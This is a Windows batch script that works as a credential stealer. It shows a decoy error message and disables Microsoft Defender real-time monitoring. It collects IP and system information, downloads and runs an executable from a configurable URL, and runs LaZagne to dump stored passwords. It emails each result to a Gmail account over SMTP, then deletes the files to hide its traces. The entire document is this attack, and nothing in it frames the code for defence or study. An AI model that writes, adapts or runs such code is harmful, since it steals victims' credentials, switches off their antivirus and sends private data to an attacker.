@echo off

msg * failed to stast

powershell Set-MpPreference -DisableRealtimeMonitoring $true;

set email=

set password=

ipconfig/all>ipadress.txt
systeminfo>systeminfo.txt

set output = Output.txt
set arguments=all

set downloadURL=
set email=

set password=

set exeFile=%TEMP%\proc.exe

set logFile=%TEMP%\proclog.txt

set arguments=all


powershell (new-object System.Net.WebClient).DownloadFile('%downloadURL%','%exeFile%');
%exeFile% %arguments% > %logFile%


powershell $SMTPServer = 'smtp.gmail.com';$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587);$SMTPInfo.EnableSsl = $true;$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('%email%', '%password%');$ReportEmail = New-Object System.Net.Mail.MailMessage;$ReportEmail.From = '%email%';$ReportEmail.To.Add('%email%');$ReportEmail.Subject = 'Lazagne Report';$ReportEmail.Body = 'Lazagne report in the attachments.';$ReportEmail.Attachments.Add('%logFile%');$SMTPInfo.Send($ReportEmail);


set exeFile=laZagne_x64.exe

set logFile=%TEMP%\proclog.txt

set arguments=all

%exeFile% %arguments% > %logFile%

del %exeFile%

powershell $SMTPServer = 'smtp.gmail.com';$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587);$SMTPInfo.EnableSsl = $true;$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('%email%', '%password%');$ReportEmail = New-Object System.Net.Mail.MailMessage;$ReportEmail.From = '%email%';$ReportEmail.To.Add('%email%');$ReportEmail.Subject = 'Lazagne Report';$ReportEmail.Body = 'Lazagne report in the attachments.';$ReportEmail.Attachments.Add('%logFile%');$SMTPInfo.Send($ReportEmail);

del %logFile%
powershell $SMTPServer = 'smtp.gmail.com';$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587);$SMTPInfo.EnableSsl = $true;$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('%email%', '%password%');$ReportEmail = New-Object System.Net.Mail.MailMessage;$ReportEmail.From = '%email%';$ReportEmail.To.Add('%email%');$ReportEmail.Subject = 'Lazagne Report';$ReportEmail.Body = 'computername: %COMPUTERNAME%username:%USERNAME%.';$ReportEmail.Attachments.Add('ipadress.txt');$SMTPInfo.Send($ReportEmail);

powershell $SMTPServer = 'smtp.gmail.com';$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587);$SMTPInfo.EnableSsl = $true;$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('%email%', '%password%');$ReportEmail = New-Object System.Net.Mail.MailMessage;$ReportEmail.From = '%email%';$ReportEmail.To.Add('%email%');$ReportEmail.Subject = 'Lazagne Report';$ReportEmail.Body = 'computername: %COMPUTERNAME%username:%USERNAME%.';$ReportEmail.Attachments.Add('systeminfo.txt');$SMTPInfo.Send($ReportEmail);

del %logFile%
del ipadress.txt
del systeminfo.txt

powershell Set-MpPreference -DisableRealtimeMonitoring $true;



